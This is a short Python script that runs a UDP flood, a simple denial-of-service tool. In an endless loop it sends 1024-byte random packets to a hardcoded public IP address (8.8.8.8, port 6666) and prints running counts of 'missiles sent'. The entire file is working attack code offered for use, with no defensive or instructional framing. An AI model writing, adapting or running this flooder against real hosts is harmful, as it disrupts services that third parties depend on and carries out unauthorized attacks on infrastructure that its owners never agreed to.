import socket
import random
import time
import sys
import threading
TARGET_IP = "8.8.8.8"
TARGET_PORT = 6666
def attack_ddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_packet = random._urandom(1024) 
    count = 0
    print(f"\nLAUNCHING FIRE ON PORT {TARGET_PORT}...")
    try:
        while True:
            sock.sendto(bytes_packet, (TARGET_IP, TARGET_PORT))
            count += 1
            if count % 2000 == 0:
                print(f"{count} missiles sent to port {TARGET_PORT}")
    except KeyboardInterrupt:
        print("\nAttack stopped.")
        sock.close()
if __name__ == "__main__":
    attack_ddos()